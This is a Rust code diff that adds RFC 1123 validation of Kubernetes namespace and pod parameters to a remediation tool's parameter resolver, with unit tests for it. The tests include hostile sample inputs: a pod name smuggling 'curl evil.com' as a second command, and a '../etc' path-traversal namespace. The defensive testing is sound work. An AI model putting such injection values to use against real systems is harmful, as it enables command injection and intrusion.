@@ -17,8 +17,8 @@ use std::sync::Mutex;
 
 use chrono::{Duration, Utc};
 use ravn_core::{
-    ActionResult, ApprovalRef, CommandEnvelope, Decision, Event, RemediationProposal,
-    RemediationRecord, Template,
+    is_valid_k8s_label, ActionResult, ApprovalRef, CommandEnvelope, Decision, Event,
+    RemediationProposal, RemediationRecord, Template,
 };
 use uuid::Uuid;
 
@@ -74,8 +74,19 @@ impl TemplateRegistry {
     }
 }
 
+/// Parameter names that carry Kubernetes identifiers and must conform to RFC 1123
+/// DNS-label rules. Any template parameter whose name appears in this set will
+/// be validated before the proposal is built — a hostile or malformed value
+/// from a Kubernetes event is rejected here, before it can reach the K8s API.
+const K8S_ID_PARAM_NAMES: &[&str] = &["namespace", "pod", "deployment", "name"];
+
 /// Resolve a template's declared parameters against an event by navigating the
 /// dotted `from` path (e.g. `payload.unit`) through the event's JSON form.
+///
+/// Parameter values whose names are listed in [`K8S_ID_PARAM_NAMES`] are
+/// validated against RFC 1123 DNS-label rules before being accepted. This
+/// guards the K8s API surface against injection-shaped values that a
+/// compromised or buggy event source might supply.
 pub fn resolve_params(template: &Template, event: &Event) -> anyhow::Result<BTreeMap<String, String>> {
     let event_json = serde_json::to_value(event)?;
     let mut params = BTreeMap::new();
@@ -89,6 +100,16 @@ pub fn resolve_params(template: &Template, event: &Event) -> anyhow::Result<BTre
         let value = cur
             .as_str()
             .ok_or_else(|| anyhow::anyhow!("parameter {name}: {} is not a string", spec.from))?;
+
+        // Validate Kubernetes identifiers before they can reach any API call.
+        if K8S_ID_PARAM_NAMES.contains(&name.as_str()) && !is_valid_k8s_label(value) {
+            anyhow::bail!(
+                "parameter {name}: value {value:?} is not a valid Kubernetes identifier \
+                 (RFC 1123 DNS label: 1–63 lowercase alphanumeric or '-' chars, \
+                 must start and end with alphanumeric)"
+            );
+        }
+
         params.insert(name.clone(), value.to_string());
     }
     Ok(params)
@@ -406,7 +427,11 @@ fn auto_execute(
 #[cfg(test)]
 mod tests {
     use super::*;
-    use ravn_core::{ActionStatus, AgentId, Capability, FailedUnitPayload, Payload, Severity, Source};
+    use ravn_core::{
+        ActionStatus, AgentId, Capability, FailedUnitPayload, KubeWorkloadPayload,
+        ParameterSpec, ParamType, Payload, RiskTier, Rollback, Severity, Source,
+        Template, TemplateMatch,
+    };
     use ravn_crypto::{verify_envelope, verifying_key_from_b64};
 
     fn failed_unit_event(unit: &str) -> Event {
@@ -568,5 +593,119 @@ mod tests {
         assert!(store.reject(id, "olaf".into(), Some("not now".into())));
         let rec = store.list().into_iter().next().unwrap();
         assert!(matches!(rec.decision, Decision::Rejected { .. }));
+    }
+
+    // ── K8s identifier validation in resolve_params (issue #145) ─────────
+
+    /// Build a minimal K8s pod-restart template with `namespace` and `pod`
+    /// parameters extracted from `payload.namespace` and `payload.name`.
+    fn k8s_pod_restart_template() -> Template {
+        let mut parameters = BTreeMap::new();
+        parameters.insert(
+            "namespace".to_string(),
+            ParameterSpec { ty: ParamType::String, from: "payload.namespace".to_string() },
+        );
+        parameters.insert(
+            "pod".to_string(),
+            ParameterSpec { ty: ParamType::String, from: "payload.name".to_string() },
+        );
+        Template {
+            id: "k8s-pod-restart".to_string(),
+            version: 1,
+            title: "Restart a crashed Kubernetes pod".to_string(),
+            risk_tier: RiskTier::Guarded,
+            match_: TemplateMatch {
+                source: Source::KubeWorkload,
+                conditions: BTreeMap::new(),
+            },
+            parameters,
+            preconditions: vec![],
+            steps: vec![Capability::KubePodRestart {
+                namespace: "{{namespace}}".to_string(),
+                pod: "{{pod}}".to_string(),
+            }],
+            verify: None,
+            rollback: Rollback::None,
+        }
+    }
+
+    fn kube_workload_event(namespace: &str, pod_name: &str) -> Event {
+        let now = Utc::now();
+        Event {
+            id: uuid::Uuid::now_v7(),
+            occurred_at: now,
+            observed_at: now,
+            agent_id: AgentId(uuid::Uuid::now_v7()),
+            host: "k8s-controller".into(),
+            severity: Severity::Error,
+            title: format!("{pod_name} crashlooping"),
+            category_hints: vec![],
+            payload: Payload::KubeWorkload(KubeWorkloadPayload {
+                namespace: namespace.into(),
+                name: pod_name.into(),
+                object_kind: "Pod".into(),
+                reason: "CrashLoopBackOff".into(),
+                ..Default::default()
+            }),
+        }
+    }
+
+    #[test]
+    fn valid_k8s_params_resolve_successfully() {
+        let tpl = k8s_pod_restart_template();
+        let event = kube_workload_event("payments", "api-7d9f");
+        let params = resolve_params(&tpl, &event).unwrap();
+        assert_eq!(params.get("namespace").map(String::as_str), Some("payments"));
+        assert_eq!(params.get("pod").map(String::as_str), Some("api-7d9f"));
+    }
+
+    #[test]
+    fn uppercase_namespace_in_event_is_rejected_at_resolve() {
+        let tpl = k8s_pod_restart_template();
+        let event = kube_workload_event("Payments", "api-7d9f");
+        let err = resolve_params(&tpl, &event).unwrap_err();
+        assert!(err.to_string().contains("namespace"), "error must name the offending field");
+        assert!(err.to_string().contains("Payments"), "error must include the bad value");
+    }
+
+    #[test]
+    fn injection_pod_name_in_event_is_rejected_at_resolve() {
+        let tpl = k8s_pod_restart_template();
+        let event = kube_workload_event("payments", "api; curl evil.com");
+        let err = resolve_params(&tpl, &event).unwrap_err();
+        assert!(err.to_string().contains("pod"));
+    }
+
+    #[test]
+    fn path_traversal_namespace_is_rejected_at_resolve() {
+        let tpl = k8s_pod_restart_template();
+        let event = kube_workload_event("../etc", "api");
+        let err = resolve_params(&tpl, &event).unwrap_err();
+        assert!(err.to_string().contains("namespace"));
+    }
+
+    #[test]
+    fn empty_namespace_in_event_is_rejected_at_resolve() {
+        let tpl = k8s_pod_restart_template();
+        let event = kube_workload_event("", "api");
+        let err = resolve_params(&tpl, &event).unwrap_err();
+        assert!(err.to_string().contains("namespace"));
+    }
+
+    #[test]
+    fn overly_long_pod_name_in_event_is_rejected_at_resolve() {
+        let tpl = k8s_pod_restart_template();
+        let long_name = "a".repeat(64);
+        let event = kube_workload_event("payments", &long_name);
+        let err = resolve_params(&tpl, &event).unwrap_err();
+        assert!(err.to_string().contains("pod"));
+    }
+
+    #[test]
+    fn whitespace_in_k8s_id_in_event_is_rejected_at_resolve() {
+        let tpl = k8s_pod_restart_template();
+        let event = kube_workload_event("pay ments", "api");
+        let err = resolve_params(&tpl, &event).unwrap_err();
+        assert!(err.to_string().contains("namespace"));
     }
 }
